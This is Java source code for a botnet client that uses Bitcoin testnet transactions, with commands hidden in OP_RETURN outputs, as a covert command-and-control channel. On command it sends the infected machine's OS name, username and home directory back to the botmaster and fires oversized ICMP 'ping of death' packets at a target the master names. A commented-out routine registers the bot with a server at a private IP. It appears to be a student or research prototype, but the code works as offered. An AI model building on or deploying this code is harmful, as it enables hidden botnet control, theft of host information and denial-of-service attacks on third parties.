import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.ECKey;
import org.bitcoinj.core.NetworkParameters;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionConfidence;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.kits.WalletAppKit;
import org.bitcoinj.params.TestNet3Params;
import org.bitcoinj.script.Script;
import org.bitcoinj.script.ScriptBuilder;
import org.bitcoinj.utils.BriefLogFormatter;
import org.bitcoinj.wallet.SendRequest;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
import org.icmp4j.IcmpPingRequest;
import org.icmp4j.IcmpPingResponse;
import org.icmp4j.IcmpPingUtil;

import com.google.common.util.concurrent.FutureCallback;
import com.google.common.util.concurrent.Futures;

public class Bot {

	private static Address masterAddress;
    private static WalletAppKit kit;
    static List<Address> list;
    public static void main(String[] args) throws Exception {
        // This line makes the log output more compact and easily read, especially when using the JDK log adapter.
        BriefLogFormatter.init();
        

        // Figure out which network we should connect to. Each one gets its own set of files.
        NetworkParameters params;
        String filePrefix;
        params = TestNet3Params.get();
        filePrefix = "forwarding-service-testnet";
        

        // Start up a basic app using a class that automates some boilerplate.
        kit = new WalletAppKit(params, new File("Bot3"), filePrefix);
        
        // Download the block chain and wait until it's done.
        kit.startAsync();
        kit.awaitRunning();

        // We want to know when we receive money.
        kit.wallet().addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet w, Transaction tx, Coin prevBalance, Coin newBalance) {
                // Runs in the dedicated "user thread" (see bitcoinj docs for more info on this).
                //
                // The transaction "tx" can either be pending, or included into a block (we didn't see the broadcast).
                Coin value = tx.getValueSentToMe(w);
                System.out.println("Received tx for " + value.toFriendlyString() + ": " + tx);
                System.out.println("Transaction will be forwarded after it confirms.");
                // Wait until it's made it into the block chain (may run immediately if it's already there).
                //
                // For this dummy app of course, we could just forward the unconfirmed transaction. If it were
                // to be double spent, no harm done. Wallet.allowSpendingUnconfirmedTransactions() would have to
                // be called in onSetupCompleted() above. But we don't do that here to demonstrate the more common
                // case of waiting for a block.
                
                if(kit.wallet().getBalance().isGreaterThan(Coin.MILLICOIN)){
                	 System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
                     try {
     					String messaggio=readOpReturn(tx);
     					String[] v=messaggio.split("-");
     					String comando=v[0];
     					
     				System.out.println("comando: "+comando);
     				
     				String addressString=v[1];
     				String serverAddress=v[2];
     				
     				System.out.println("address:"+addressString);
     				Address address=new Address(params,addressString);
     					
     					//gestione delle risposte a seconda dei comandi del botMaster
     					switch (comando) {
     					case "ping":
     						sendCommand("ping_ok-"+list.get(0).toString(), address);
     						break;
     					case "os":
     						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
                             break;
     					case "username":
     						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
     						break;
     					case "userhome":
     						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
     						break;
     					case "pingOfDeath":
    						String risultato=pingOfDeath(serverAddress);
    						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
     					default:
     						break;
     					}
     				} catch (Exception e) {
     					// TODO Auto-generated catch block
     					e.printStackTrace();
     				}
                }
                else{
                
                Futures.addCallback(tx.getConfidence().getDepthFuture(1), new FutureCallback<TransactionConfidence>() {
                    @Override
                    public void onSuccess(TransactionConfidence result) {
                        System.out.println("Transazione ricevuta con successo!!!!!!");
                       
                        /*
                         * Inoltrare la transazione ricevuta nuovamente al BotMaster
                         */
                       // forwardCommand("ping_ok", tx);
                       
                        System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
                        try {
        					String messaggio=readOpReturn(tx);
        					String[] v=messaggio.split("-");
        					String comando=v[0];
        					
        				System.out.println("comando: "+comando);
        				
        				String addressString=v[1];
        				String serverAddress=v[2];
        				
        				System.out.println("address:"+addressString);
        				Address address=new Address(params,addressString);
        					
        					//gestione delle risposte a seconda dei comandi del botMaster
        					switch (comando) {
        					case "ping":
        						sendCommand("ping_ok-"+list.get(0).toString(), address);
        						break;
        					case "os":
        						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
                                break;
        					case "username":
        						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
        						break;
        					case "userhome":
        						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
        						break;
        					case "pingOfDeath":
        						String risultato=pingOfDeath(serverAddress);
        						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
        					default:
        						break;
        					}
        				} catch (Exception e) {
        					// TODO Auto-generated catch block
        					e.printStackTrace();
        				}
                    }

                    @Override
                    public void onFailure(Throwable t) {
                        // This kind of future can't fail, just rethrow in case something weird happens.
                        throw new RuntimeException(t);
                    }
                });
                }
            }
        });

         list = kit.wallet().getWatchedAddresses();
        if (list.size() < 1) {
            kit.wallet().addWatchedAddress(kit.wallet().freshReceiveAddress());
            System.out.println("New address created");
        }
        
      

        System.out.println("You have " + list.size() + " addresses!");
        for (Address a: list) {
            System.out.println("Send coins to: " +a.toString());
        }

        String balance = kit.wallet().getBalance().toFriendlyString();
        System.out.println(balance);
     
        System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");

        //String myAddress=list.get(0).toString();
        //registerBot(myAddress);
        
       // pingOfDeath();
        
        
        try {
            Thread.sleep(Long.MAX_VALUE);
        } catch (InterruptedException ignored) {}
        
        
    }
    
    public static String readOpReturn(Transaction tx) throws Exception {
    	String mess=""
;		List<TransactionOutput> ti = tx.getOutputs();
		
		for (TransactionOutput t : ti) {
			Script script = t.getScriptPubKey();
			
			if (script.isOpReturn()) {
				byte[] message = new byte[script.getProgram().length-2];
				
				System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length-2);
					
				mess = new String(message);
				System.out.println("OP RETURN "+mess);
				
			}
			
		}return mess;
		
	}
    
    /*
     * Invio di un comando a un bot
     */
    public static String sendCommand(String command, Address botAddress) throws Exception {

		byte[] hash = command.getBytes("UTF-8");
		
		Transaction transaction = new Transaction(kit.wallet().getParams());
		
		transaction.addOutput(Coin.MILLICOIN, botAddress);
		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
	
		SendRequest sendRequest = SendRequest.forTx(transaction);

		String string = new String(hash);
		System.out.println("Sending ... " +string);
    	
		kit.wallet().completeTx(sendRequest);   // Could throw InsufficientMoneyException

		kit.peerGroup().setMaxConnections(1);
		kit.peerGroup().broadcastTransaction(sendRequest.tx);
		
		return transaction.getHashAsString();		
	}
    
    public static String pingOfDeath(String serverAddress){
    	// request
    	
    	final IcmpPingRequest request = IcmpPingUtil.createIcmpPingRequest ();
    	
    	request.setHost (serverAddress);

        request.setPacketSize(650);
    	// repeat a few times
    	for (int count = 1; count <= 4; count ++) {

    	// delegate
    	final IcmpPingResponse response = IcmpPingUtil.executePingRequest (request);

    	// log
    	final String formattedResponse = IcmpPingUtil.formatResponse (response);
    	System.out.println (formattedResponse);

    	// rest
    	try {
			Thread.sleep (1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	}
    	String result="Il server è stato pingato";
    	return result;
    }
    
   /* public static void registerBot(String address) throws IOException{
 	   String url="http://192.168.43.182:8080/ServerBotChain/WriteBotServlet?address="+address;
 		 URL u = new URL(url);
 		 URLConnection ucon = u.openConnection();
 		  ucon.getInputStream();
    }*/
    
    
    
   /* public static void forwardCommand(String response, String address) {
    	List<TransactionOutput> out = tx.getOutputs();
        //List<TransactionInput> in = tx.getInputs();
        
        Address a = null;
        for (TransactionOutput o : out) {
        	o.getAddressFromP2PKHScript(kit.wallet().getParams());
        	if (o.getAddressFromP2PKHScript(kit.wallet().getParams()) != null) {
        		a = o.getAddressFromP2PKHScript(kit.wallet().getParams());
        		break;
        	}
        }
        System.out.println("Hai ricevuto i Coins da: " + a.toString());
        
        try {
			sendCommand(response, a);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    */
    
}